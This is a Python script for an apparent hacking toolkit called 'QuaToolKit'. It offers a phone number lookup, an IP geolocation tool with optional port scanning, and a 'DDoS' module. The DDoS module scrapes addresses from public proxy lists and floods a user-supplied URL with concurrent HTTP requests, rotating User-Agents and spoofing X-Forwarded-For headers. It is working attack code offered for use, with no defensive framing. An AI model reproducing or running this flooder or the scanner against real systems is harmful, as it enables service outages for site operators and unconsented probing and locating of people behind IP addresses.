#!/usr/bin/env python3
import sys
import asyncio
import aiohttp
import random
import re
import itertools
import os
import time
import requests
import socket
from typing import Dict, Any
from getpass import getpass

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animate_text(text, delay=0.01):
    for char in text:
        print(f"\033[31m{char}\033[0m", end='', flush=True)
        time.sleep(delay)
    print()

def show_password_menu():
    clear_screen()

    password_art = """
  █████   █    ██  ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓
▒██▓  ██▒ ██  ▓██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒
▒██▒  ██░▓██  ▒██░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░
░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░
░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
 ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
   ░   ░  ░░░ ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░
    ░       ░           ░  ░            ░ ░      ░ ░      ░  ░

discord: quantumpeakk
github: https://github.com/quantumpeakk
telegram: t.me/wessydll
"""

    for line in password_art.split('\n'):
        animate_text(line, 0.003)

    print()
    password_input = input("\033[31mENTER PASSWORD: \033[0m")

    if password_input == "quatoolkit":
        show_main_menu()
    else:
        print("\033[31mWrong password - Şifre yanlış\033[0m")
        time.sleep(2)
        show_password_menu()

def show_main_menu():
    clear_screen()

    main_menu_art = """
  █████   █    ██  ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓
▒██▓  ██▒ ██  ▓██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒
▒██▒  ██░▓██  ▒██░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░
░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░
░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
 ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
   ░   ░  ░░░ ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░
    ░       ░           ░  ░            ░ ░      ░ ░      ░  ░

discord: quantumpeakk
github: https://github.com/quantumpeakk
telegram: t.me/wessydll
"""

    for line in main_menu_art.split('\n'):
        animate_text(line, 0.003)

    print("\033[31mWelcome to QuaToolKit.\033[0m")
    animate_text("_________________________________", 0.01)
    animate_text("1. Number Query / Tel No Sorgu", 0.01)
    animate_text("_________________________________", 0.01)
    animate_text("2. IP Query / IP adres sorgu", 0.01)
    animate_text("_________________________________", 0.01)
    animate_text("3. DDoS", 0.01)
    animate_text("_________________________________", 0.01)
    animate_text("0. Exit.", 0.01)
    animate_text("_________________________________", 0.01)
    print()

    choice = input("\033[31m➤ \033[0m").strip()

    if choice == "1":
        phone_number_query()
    elif choice == "2":
        ip_query()
    elif choice == "3":
        ddos_menu()
    elif choice == "0":
        sys.exit()
    else:
        show_main_menu()

def phone_number_query():
    clear_screen()
    print("\033[31m")
    print("""
▄▄▄█████▓▓█████  ██▓        ███▄    █ ▓█████▄▄▄█████▓
▓  ██▒ ▓▒▓█   ▀ ▓██▒        ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▒ ▓██░ ▒░▒███   ▒██░       ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
░ ▓██▓ ░ ▒▓█  ▄ ▒██░       ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░
  ▒██▒ ░ ░▒████▒░██████▒   ▒██░   ▓██░░▒████▒ ▒██▒ ░
  ▒ ░░   ░░ ▒░ ░░ ▒░▓  ░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░
    ░     ░ ░  ░░ ░ ▒  ░   ░ ░░   ░ ▒░ ░ ░  ░   ░
  ░         ░     ░ ░         ░   ░ ░    ░    ░
            ░  ░    ░  ░            ░    ░  ░

DEVELOPER: quantumpeak
https://github.com/quantumpeakk
""")
    print("\033[0m")

    def clean_phone_number(phone: str) -> str:
        cleaned = re.sub(r'[^\d+]', '', phone)
        if not cleaned.startswith('+') and cleaned.startswith('0'):
            cleaned = '+90' + cleaned[1:]
        elif not cleaned.startswith('+'):
            cleaned = '+' + cleaned
        return cleaned

    def get_country_info(country_code: str) -> Dict[str, str]:
        country_codes = {
            '+1': {'name': 'USA/Canada', 'flag': '🇺🇸'},
            '+44': {'name': 'United Kingdom', 'flag': '🇬🇧'},
            '+90': {'name': 'Turkey', 'flag': '🇹🇷'},
            '+49': {'name': 'Germany', 'flag': '🇩🇪'},
            '+33': {'name': 'France', 'flag': '🇫🇷'},
            '+39': {'name': 'Italy', 'flag': '🇮🇹'},
            '+34': {'name': 'Spain', 'flag': '🇪🇸'},
            '+7': {'name': 'Russia/Kazakhstan', 'flag': '🇷🇺'},
            '+81': {'name': 'Japan', 'flag': '🇯🇵'},
            '+86': {'name': 'China', 'flag': '🇨🇳'},
            '+91': {'name': 'India', 'flag': '🇮🇳'},
            '+20': {'name': 'Egypt', 'flag': '🇪🇬'},
            '+971': {'name': 'UAE', 'flag': '🇦🇪'},
            '+966': {'name': 'Saudi Arabia', 'flag': '🇸🇦'},
            '+98': {'name': 'Iran', 'flag': '🇮🇷'},
            '+994': {'name': 'Azerbaijan', 'flag': '🇦🇿'},
            '+995': {'name': 'Georgia', 'flag': '🇬🇪'},
        }
        for code_len in range(4, 0, -1):
            code = country_code[:code_len]
            if code in country_codes:
                return country_codes[code]
        return {'name': 'Unknown Country', 'flag': '🏳️'}

    def get_turkish_operator_info(number: str) -> Dict[str, Any]:
        if len(number) < 10:
            return {'operator': 'Unknown', 'line_type': 'Unknown', 'location': 'Unknown'}

        operator_codes = {
            '530': {'operator': 'Turkcell', 'type': 'Mobile'},
            '531': {'operator': 'Turkcell', 'type': 'Mobile'},
            '532': {'operator': 'Turkcell', 'type': 'Mobile'},
            '533': {'operator': 'Turkcell', 'type': 'Mobile'},
            '534': {'operator': 'Turkcell', 'type': 'Mobile'},
            '535': {'operator': 'Turkcell', 'type': 'Mobile'},
            '536': {'operator': 'Turkcell', 'type': 'Mobile'},
            '537': {'operator': 'Turkcell', 'type': 'Mobile'},
            '538': {'operator': 'Turkcell', 'type': 'Mobile'},
            '539': {'operator': 'Turkcell', 'type': 'Mobile'},
            '540': {'operator': 'Vodafone', 'type': 'Mobile'},
            '541': {'operator': 'Vodafone', 'type': 'Mobile'},
            '542': {'operator': 'Vodafone', 'type': 'Mobile'},
            '543': {'operator': 'Vodafone', 'type': 'Mobile'},
            '544': {'operator': 'Vodafone', 'type': 'Mobile'},
            '545': {'operator': 'Vodafone', 'type': 'Mobile'},
            '546': {'operator': 'Vodafone', 'type': 'Mobile'},
            '547': {'operator': 'Vodafone', 'type': 'Mobile'},
            '548': {'operator': 'Vodafone', 'type': 'Mobile'},
            '549': {'operator': 'Vodafone', 'type': 'Mobile'},
            '550': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '551': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '552': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '553': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '554': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '555': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '556': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '557': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '558': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '559': {'operator': 'Türk Telekom', 'type': 'Mobile'},
            '212': {'operator': 'İstanbul (Fixed)', 'type': 'Landline', 'location': 'İstanbul (Europe)'},
            '216': {'operator': 'İstanbul (Fixed)', 'type': 'Landline', 'location': 'İstanbul (Anatolia)'},
            '224': {'operator': 'Bursa (Fixed)', 'type': 'Landline', 'location': 'Bursa'},
            '222': {'operator': 'Eskişehir (Fixed)', 'type': 'Landline', 'location': 'Eskişehir'},
            '232': {'operator': 'İzmir (Fixed)', 'type': 'Landline', 'location': 'İzmir'},
            '242': {'operator': 'Antalya (Fixed)', 'type': 'Landline', 'location': 'Antalya'},
            '252': {'operator': 'Muğla (Fixed)', 'type': 'Landline', 'location': 'Muğla'},
            '256': {'operator': 'Denizli (Fixed)', 'type': 'Landline', 'location': 'Denizli'},
            '258': {'operator': 'Isparta (Fixed)', 'type': 'Landline', 'location': 'Isparta'},
            '262': {'operator': 'Kocaeli (Fixed)', 'type': 'Landline', 'location': 'Kocaeli'},
            '264': {'operator': 'Sakarya (Fixed)', 'type': 'Landline', 'location': 'Sakarya'},
            '266': {'operator': 'Balıkesir (Fixed)', 'type': 'Landline', 'location': 'Balıkesir'},
            '274': {'operator': 'Kütahya (Fixed)', 'type': 'Landline', 'location': 'Kütahya'},
            '276': {'operator': 'Uşak (Fixed)', 'type': 'Landline', 'location': 'Uşak'},
            '282': {'operator': 'Tekirdağ (Fixed)', 'type': 'Landline', 'location': 'Tekirdağ'},
            '284': {'operator': 'Edirne (Fixed)', 'type': 'Landline', 'location': 'Edirne'},
            '286': {'operator': 'Çanakkale (Fixed)', 'type': 'Landline', 'location': 'Çanakkale'},
            '288': {'operator': 'Kırklareli (Fixed)', 'type': 'Landline', 'location': 'Kırklareli'},
            '312': {'operator': 'Ankara (Fixed)', 'type': 'Landline', 'location': 'Ankara'},
            '318': {'operator': 'Kırıkkale (Fixed)', 'type': 'Landline', 'location': 'Kırıkkale'},
            '332': {'operator': 'Konya (Fixed)', 'type': 'Landline', 'location': 'Konya'},
            '338': {'operator': 'Karaman (Fixed)', 'type': 'Landline', 'location': 'Karaman'},
            '342': {'operator': 'Gaziantep (Fixed)', 'type': 'Landline', 'location': 'Gaziantep'},
            '344': {'operator': 'Kilis (Fixed)', 'type': 'Landline', 'location': 'Kilis'},
            '346': {'operator': 'Hatay (Fixed)', 'type': 'Landline', 'location': 'Hatay'},
            '348': {'operator': 'Kahramanmaraş (Fixed)', 'type': 'Landline', 'location': 'Kahramanmaraş'},
            '352': {'operator': 'Kayseri (Fixed)', 'type': 'Landline', 'location': 'Kayseri'},
            '354': {'operator': 'Sivas (Fixed)', 'type': 'Landline', 'location': 'Sivas'},
            '356': {'operator': 'Yozgat (Fixed)', 'type': 'Landline', 'location': 'Yozgat'},
            '358': {'operator': 'Tokat (Fixed)', 'type': 'Landline', 'location': 'Tokat'},
            '362': {'operator': 'Samsun (Fixed)', 'type': 'Landline', 'location': 'Samsun'},
            '364': {'operator': 'Çorum (Fixed)', 'type': 'Landline', 'location': 'Çorum'},
            '366': {'operator': 'Amasya (Fixed)', 'type': 'Landline', 'location': 'Amasya'},
            '368': {'operator': 'Ordu (Fixed)', 'type': 'Landline', 'location': 'Ordu'},
            '370': {'operator': 'Giresun (Fixed)', 'type': 'Landline', 'location': 'Giresun'},
            '372': {'operator': 'Trabzon (Fixed)', 'type': 'Landline', 'location': 'Trabzon'},
            '374': {'operator': 'Rize (Fixed)', 'type': 'Landline', 'location': 'Rize'},
            '376': {'operator': 'Artvin (Fixed)', 'type': 'Landline', 'location': 'Artvin'},
            '378': {'operator': 'Gümüşhane (Fixed)', 'type': 'Landline', 'location': 'Gümüşhane'},
            '382': {'operator': 'Aksaray (Fixed)', 'type': 'Landline', 'location': 'Aksaray'},
            '384': {'operator': 'Nevşehir (Fixed)', 'type': 'Landline', 'location': 'Nevşehir'},
            '386': {'operator': 'Kırşehir (Fixed)', 'type': 'Landline', 'location': 'Kırşehir'},
            '388': {'operator': 'Niğde (Fixed)', 'type': 'Landline', 'location': 'Niğde'},
            '412': {'operator': 'Diyarbakır (Fixed)', 'type': 'Landline', 'location': 'Diyarbakır'},
            '414': {'operator': 'Şanlıurfa (Fixed)', 'type': 'Landline', 'location': 'Şanlıurfa'},
            '416': {'operator': 'Adıyaman (Fixed)', 'type': 'Landline', 'location': 'Adıyaman'},
            '422': {'operator': 'Malatya (Fixed)', 'type': 'Landline', 'location': 'Malatya'},
            '424': {'operator': 'Elazığ (Fixed)', 'type': 'Landline', 'location': 'Elazığ'},
            '426': {'operator': 'Bingöl (Fixed)', 'type': 'Landline', 'location': 'Bingöl'},
            '428': {'operator': 'Tunceli (Fixed)', 'type': 'Landline', 'location': 'Tunceli'},
            '432': {'operator': 'Van (Fixed)', 'type': 'Landline', 'location': 'Van'},
            '434': {'operator': 'Bitlis (Fixed)', 'type': 'Landline', 'location': 'Bitlis'},
            '436': {'operator': 'Muş (Fixed)', 'type': 'Landline', 'location': 'Muş'},
            '438': {'operator': 'Hakkari (Fixed)', 'type': 'Landline', 'location': 'Hakkari'},
            '442': {'operator': 'Erzurum (Fixed)', 'type': 'Landline', 'location': 'Erzurum'},
            '446': {'operator': 'Erzincan (Fixed)', 'type': 'Landline', 'location': 'Erzincan'},
            '452': {'operator': 'Mardin (Fixed)', 'type': 'Landline', 'location': 'Mardin'},
            '454': {'operator': 'Siirt (Fixed)', 'type': 'Landline', 'location': 'Siirt'},
            '456': {'operator': 'Batman (Fixed)', 'type': 'Landline', 'location': 'Batman'},
            '458': {'operator': 'Şırnak (Fixed)', 'type': 'Landline', 'location': 'Şırnak'},
            '462': {'operator': 'Trabzon (Fixed)', 'type': 'Landline', 'location': 'Trabzon'},
            '464': {'operator': 'Kars (Fixed)', 'type': 'Landline', 'location': 'Kars'},
            '466': {'operator': 'Iğdır (Fixed)', 'type': 'Landline', 'location': 'Iğdır'},
            '468': {'operator': 'Ardahan (Fixed)', 'type': 'Landline', 'location': 'Ardahan'},
            '472': {'operator': 'Ağrı (Fixed)', 'type': 'Landline', 'location': 'Ağrı'},
            '474': {'operator': 'Bayburt (Fixed)', 'type': 'Landline', 'location': 'Bayburt'},
            '476': {'operator': 'Artvin (Fixed)', 'type': 'Landline', 'location': 'Artvin'},
            '478': {'operator': 'Giresun (Fixed)', 'type': 'Landline', 'location': 'Giresun'},
            '482': {'operator': 'Adana (Fixed)', 'type': 'Landline', 'location': 'Adana'},
            '484': {'operator': 'Osmaniye (Fixed)', 'type': 'Landline', 'location': 'Osmaniye'},
            '486': {'operator': 'Mersin (Fixed)', 'type': 'Landline', 'location': 'Mersin'},
        }

        if number.startswith('+90'):
            num_without_country = number[3:]
            if len(num_without_country) >= 3:
                prefix = num_without_country[:3]
                if prefix in operator_codes:
                    result = operator_codes[prefix].copy()
                    if 'location' not in result:
                        result['location'] = 'Turkey (Mobile Network)'
                    return result
                if len(num_without_country) >= 3:
                    area_code = num_without_country[:3]
                    if area_code in operator_codes:
                        result = operator_codes[area_code].copy()
                        if 'location' not in result:
                            result['location'] = f'Turkey (Area Code: {area_code})'
                        return result
        return {'operator': 'Unknown', 'line_type': 'Unknown', 'location': 'Unknown'}

    def get_line_type(number: str) -> str:
        cleaned = re.sub(r'[^\d]', '', number)
        if cleaned.startswith('1'):
            return 'Special Service'
        elif cleaned.startswith('800'):
            return 'Toll-Free'
        elif cleaned.startswith('900'):
            return 'Premium Rate'
        elif len(cleaned) == 10:
            return 'Landline'
        elif len(cleaned) == 11:
            return 'Mobile'
        else:
            return 'Unknown'

    def query_phone_info(phone: str) -> Dict[str, Any]:
        result = {
            "original_number": phone,
            "cleaned_number": None,
            "valid": False,
            "country_code": None,
            "country_name": None,
            "country_flag": None,
            "operator": None,
            "line_type": None,
            "location": None,
            "timezone": None,
            "format_info": None,
            "risk_level": "Low"
        }

        cleaned = clean_phone_number(phone)
        result["cleaned_number"] = cleaned

        if not re.match(r'^\+\d{8,15}$', cleaned):
            result["valid"] = False
            result["format_info"] = "Invalid format"
            return result

        result["valid"] = True

        country_code_match = re.match(r'^(\+\d{1,4})', cleaned)
        if country_code_match:
            country_code = country_code_match.group(1)
            result["country_code"] = country_code
            country_info = get_country_info(country_code)
            result["country_name"] = country_info['name']
            result["country_flag"] = country_info['flag']

        result["line_type"] = get_line_type(cleaned)

        if cleaned.startswith('+90'):
            operator_info = get_turkish_operator_info(cleaned)
            result["operator"] = operator_info.get('operator', 'Unknown')
            result["line_type"] = operator_info.get('type', result["line_type"])
            result["location"] = operator_info.get('location', 'Unknown')
            result["timezone"] = "UTC+3 (Turkey Time)"
        else:
            result["location"] = result["country_name"]
            result["operator"] = "Unknown (International)"

        if result["valid"]:
            result["format_info"] = f"Valid {result['line_type']} number"

        if not result["valid"]:
            result["risk_level"] = "Invalid"
        elif result["line_type"] == "Premium Rate":
            result["risk_level"] = "High"
        elif result["line_type"] == "Unknown":
            result["risk_level"] = "Medium"

        return result

    def print_phone_info(info: Dict[str, Any]):
        print("\033[31m")
        print("╔" + "═" * 80 + "╗")
        print(f"║ {'PHONE NUMBER INFORMATION':^78} ║")
        print("╠" + "═" * 80 + "╣")
        print(f"║ {'Original Number':<20} : {info['original_number']:<57} ║")
        print(f"║ {'Cleaned Number':<20} : {info['cleaned_number'] or 'N/A':<57} ║")
        print(f"║ {'Validation':<20} : {'✅ Valid' if info['valid'] else '❌ Invalid':<57} ║")
        print(f"║ {'Country':<20} : {info['country_flag'] or ''} {info['country_name'] or 'Unknown':<55} ║")
        print(f"║ {'Country Code':<20} : {info['country_code'] or 'Unknown':<57} ║")
        print(f"║ {'Operator':<20} : {info['operator'] or 'Unknown':<57} ║")
        print(f"║ {'Line Type':<20} : {info['line_type'] or 'Unknown':<57} ║")
        print(f"║ {'Location':<20} : {info['location'] or 'Unknown':<57} ║")
        print(f"║ {'Timezone':<20} : {info['timezone'] or 'Unknown':<57} ║")
        print(f"║ {'Format Info':<20} : {info['format_info'] or 'Unknown':<57} ║")
        print(f"║ {'Risk Level':<20} : {info['risk_level']:<57} ║")
        print("╚" + "═" * 80 + "╝")
        print("\033[0m")

    phone_input = input("\033[31mEnter phone number (ex: +905551234567 or 0555 123 45 67): \033[0m").strip()
    if not phone_input:
        phone_input = "+905551234567"

    info = query_phone_info(phone_input)
    print_phone_info(info)

    input("\033[31mPress Enter to return to main menu...\033[0m")
    show_main_menu()

def ip_query():
    clear_screen()
    print("\033[31m")
    print("""
 ██▓ ██▓███      ███▄    █ ▓█████▄▄▄█████▓
▓██▒▓██░  ██▒    ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▒██▒▓██░ ██▓▒   ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
░██░▒██▄█▓▒ ▒   ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░
░██░▒██▒ ░  ░   ▒██░   ▓██░░▒████▒ ▒██▒ ░
░▓  ▒▓▒░ ░  ░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░
 ▒ ░░▒ ░        ░ ░░   ░ ▒░ ░ ░  ░   ░
 ▒ ░░░             ░   ░ ░    ░    ░
 ░                       ░    ░  ░

DEVELOPER: quantumpeak
https://github.com/quantumpeakk
""")
    print("\033[0m")

    def query_ip_info(ip: str, scan_ports: bool = False) -> Dict[str, Any]:
        result = {
            "ip": ip,
            "country": None,
            "region": None,
            "city": None,
            "district": None,
            "address": None,
            "isp": None,
            "asn": None,
            "ip_type": None,
            "reverse_dns": None,
            "latitude": None,
            "longitude": None,
            "google_maps": None,
            "services_ports": {},
            "abuse_info": None
        }

        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,asn,lat,lon,timezone"
        response = requests.get(url, timeout=10)
        data = response.json()

        if data.get("status") == "success":
            result["country"] = data.get("country")
            result["region"] = data.get("regionName")
            result["city"] = data.get("city")
            result["district"] = result["city"] if result["city"] else None
            result["address"] = f"{result['city']}, {result['region']}, {result['country']}" if result["city"] and result["region"] else None
            result["isp"] = data.get("isp")
            result["asn"] = data.get("asn")
            org = data.get("org", "").lower()
            if "mobile" in org or "cellular" in org:
                result["ip_type"] = "Mobil ağ"
            elif "hosting" in org or "cloud" in org:
                result["ip_type"] = "Hosting/Sunucu"
            elif any(x in org for x in ["dsl", "cable", "broadband"]):
                result["ip_type"] = "Kablolu/DSL"
            else:
                result["ip_type"] = "Dinamik/Statik (bilinmiyor)"
            result["latitude"] = data.get("lat")
            result["longitude"] = data.get("lon")
            if result["latitude"] and result["longitude"]:
                result["google_maps"] = f"https://www.google.com/maps?q={result['latitude']},{result['longitude']}"

        try:
            hostname = socket.gethostbyaddr(ip)[0]
            result["reverse_dns"] = hostname
        except socket.herror:
            result["reverse_dns"] = "Ters DNS kaydı yok"
        except:
            result["reverse_dns"] = "Sorgu başarısız"

        result["abuse_info"] = "AbuseIPDB için API key gerekli (ücretsiz kayıt olun)"

        if scan_ports:
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389]
            open_ports = []
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result_sock = sock.connect_ex((ip, port))
                    if result_sock == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
            if open_ports:
                result["services_ports"] = {p: "Açık" for p in open_ports}
            else:
                result["services_ports"] = "Hiçbiri (test edilen portlarda)"

        return result

    def print_ip_info(info: Dict[str, Any]):
        print("\033[31m")
        print("╔" + "═" * 80 + "╗")
        print(f"║ {'IP Bilgileri':^78} ║")
        print("╠" + "═" * 80 + "╣")
        print(f"║ {'IP':<20} : {info['ip']:<57} ║")
        print(f"║ {'Ülke':<20} : {info['country'] or 'Bilinmiyor':<57} ║")
        print(f"║ {'Bölge/İl':<20} : {info['region'] or 'Bilinmiyor':<57} ║")
        print(f"║ {'Şehir/İlçe':<20} : {info['city'] or 'Bilinmiyor':<57} ║")
        print(f"║ {'Adres Tahmini':<20} : {info['address'] or 'Bilinmiyor':<57} ║")
        print(f"║ {'ISP':<20} : {info['isp'] or 'Bilinmiyor':<57} ║")
        print(f"║ {'ASN':<20} : {info['asn'] or 'Bilinmiyor':<57} ║")
        print(f"║ {'IP Tipi':<20} : {info['ip_type'] or 'Bilinmiyor':<57} ║")
        print(f"║ {'Ters DNS':<20} : {info['reverse_dns'] or 'Bilinmiyor':<57} ║")
        if info['latitude'] and info['longitude']:
            print(f"║ {'Koordinat':<20} : {info['latitude']}, {info['longitude']:<49} ║")
            print(f"║ {'Google Maps':<20} : {info['google_maps'] or 'Bilinmiyor':<57} ║")
        print(f"║ {'Açık Portlar':<20} : {str(info['services_ports']) or 'Bilinmiyor':<57} ║")
        print(f"║ {'Abuse/Blacklist':<20} : {info['abuse_info'] or 'Bilinmiyor':<57} ║")
        print("╚" + "═" * 80 + "╝")
        print("\033[0m")

    ip_to_query = input("\033[31mIP adresini girin (ör: 31.31.31.31): \033[0m").strip()
    if not ip_to_query:
        ip_to_query = "8.8.8.8"

    scan = input("\033[31mPort tarama yapcan mı? (e/h, varsayılan h): \033[0m").strip().lower() == 'e'

    info = query_ip_info(ip_to_query, scan_ports=scan)
    print_ip_info(info)

    input("\033[31mPress Enter to return to main menu...\033[0m")
    show_main_menu()

def ddos_menu():
    clear_screen()
    print("\033[31m")
    print("""
 ██████╗ ██████╗  ██████╗ ███████╗
 ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
 ██║  ██║██║  ██║██║   ██║███████╗
 ██║  ██║██║  ██║██║   ██║╚════██║
 ██████╔╝██████╔╝╚██████╔╝███████║
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    """)
    print("\033[0m")

    UserAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    ]

    ip_list_urls = [
        "https://www.us-proxy.org",
        "https://www.socks-proxy.net",
        "https://proxyscrape.com/free-proxy-list",
        "https://www.proxynova.com/proxy-server-list/",
        "https://proxybros.com/free-proxy-list/",
        "https://proxydb.net/",
        "https://spys.one/en/free-proxy-list/",
        "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
        "https://hasdata.com/free-proxy-list",
        "https://www.proxyrack.com/free-proxy-list/",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://geonode.com/free-proxy-list",
        "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
    ]

    class AttackThread:
        def __init__(self, target_url, num_requests):
            self.target_url = target_url
            self.num_requests = num_requests

        async def fetch_ip_addresses(self, url):
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(url) as response:
                        text = await response.text()
                        ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                        return ip_addresses
                except Exception:
                    return []

        async def get_all_ips(self):
            tasks = [self.fetch_ip_addresses(url) for url in ip_list_urls]
            ip_lists = await asyncio.gather(*tasks)
            all_ips = [ip for sublist in ip_lists for ip in sublist]
            return all_ips

        async def send_request(self, session, ip_address):
            headers = {
                "User-Agent": random.choice(UserAgents),
                "X-Forwarded-For": ip_address
            }
            try:
                async with session.get(self.target_url, headers=headers) as response:
                    print(f"quatool@root {self.target_url} from IP: {ip_address} - Status: {response.status}")
            except Exception:
                pass

        async def attack(self):
            ip_list = await self.get_all_ips()
            if not ip_list:
                return
            ip_cycle = itertools.cycle(ip_list)
            async with aiohttp.ClientSession() as session:
                tasks = [self.send_request(session, next(ip_cycle)) for _ in range(self.num_requests)]
                await asyncio.gather(*tasks)

        def run(self):
            asyncio.run(self.attack())

    target_url = input("\033[31mEnter Target URL (e.g., https://example.com): \033[0m").strip()
    try:
        num_requests = int(input("\033[31mEnter Number of Requests: \033[0m").strip())
        if num_requests <= 0:
            raise ValueError
    except ValueError:
        input("\033[31mError: Number of requests must be a positive integer. Press Enter to continue...\033[0m")
        show_main_menu()
        return

    if not target_url:
        input("\033[31mError: Please provide a valid URL. Press Enter to continue...\033[0m")
        show_main_menu()
        return

    attack_thread = AttackThread(target_url, num_requests)
    try:
        attack_thread.run()
    except KeyboardInterrupt:
        print("\033[31m\nDDoS stopped by user.\033[0m")

    input("\033[31mPress Enter to return to main menu...\033[0m")
    show_main_menu()

def main():
    show_password_menu()

if __name__ == "__main__":
    main()
         
